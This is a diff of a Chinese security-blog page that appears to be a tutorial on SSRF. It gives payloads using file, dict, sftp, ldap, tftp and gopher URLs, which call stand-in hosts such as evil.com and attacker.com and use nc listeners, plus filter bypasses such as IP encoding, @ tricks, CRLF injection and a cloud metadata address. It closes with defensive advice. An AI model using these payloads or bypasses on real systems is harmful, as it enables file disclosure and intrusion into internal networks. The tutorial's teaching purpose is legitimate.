-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd<br>dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：<br>sftp:// SSH文件传输协议或安全文件传输协议<br>ldap:// 轻量级目录访问协议<br>tftp:// 简单文件传输协议<br>gopher:// 分布式文档传递服务，可使用gopherus生成payload<br></code></pre></td></tr></table></figure>
 
 <p><strong>1、file</strong></p>
 <p>这种URL Schema可以尝试从文件系统中获取文件：</p>
@@ -147,23 +352,23 @@
 <p><strong>2、dict</strong></p>
 <p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
 <blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?dict://evil.com:1337/<br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0<br></code></pre></td></tr></table></figure></blockquote>
 <p><strong>3、sftp</strong></p>
 <p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
 <blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=sftp://evil.com:1337/<br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2<br></code></pre></td></tr></table></figure></blockquote>
 <p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
 <p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
 <blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit<br></code></pre></td></tr></table></figure></blockquote>
 <p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
 <p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
 <blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET<br>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3<br></code></pre></td></tr></table></figure></blockquote>
 <p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
 <p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
 <blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="hljs-string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;<br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest<br></code></pre></td></tr></table></figure></blockquote>
 <hr>
 <h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
 <p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
@@ -177,7 +382,7 @@
 <p>一、常见的绕过方式</p>
 <p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
 <blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">可以尝试采用http基本身份认证的方式绕过<br>如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异<br>在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。<br></code></pre></td></tr></table></figure></blockquote>
 <p><strong>2.采用短网址绕过</strong></p>
 <blockquote>
 <p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
@@ -186,7 +391,7 @@
 <blockquote>
 <p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
 </blockquote>
-<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
+<p><img src="/.com//image-20250520030023-ukm1uls.png" srcset="/image/loading.gif" lazyload alt="image"></p>
 <p><strong>4.利用特殊域名</strong></p>
 <blockquote>
 <p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
@@ -203,10 +408,10 @@
 <blockquote>
 <p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a <br></code></pre></td></tr></table></figure>
 
 <p><strong>8.利用封闭的字母数字</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br>http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure>
 
 <p>二、常见限制</p>
 <p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
@@ -229,155 +434,371 @@
 <p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
 <p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmaxygi0k0009oc7ka0i1e8nq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
+
+<span class="category-chains">
+  
   
     
-<nav id="article-nav">
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
   
-    <a href="/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          (no title)
-        
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SSRF/" class="print-no-link">#SSRF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSRF</div>
+      <div>http://example.com/2025/05/20/Web/SSRF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title="DVWA靶场通关">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DVWA靶场通关</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/20/Web/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/" title="备份文件">
+                        <span class="hidden-mobile">备份文件</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-    </a>
-  
-  
-    <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title"></div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
     </div>
-  </div>
 
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+    <div class="side-col d-none d-lg-block col-lg-2">
       
-      &copy; 2025 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
 
     </div>
-    <nav id="mobile-nav">
+  </div>
+</div>
+
+
+
+
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
+
+
+
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+
+
+
   
-</nav>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
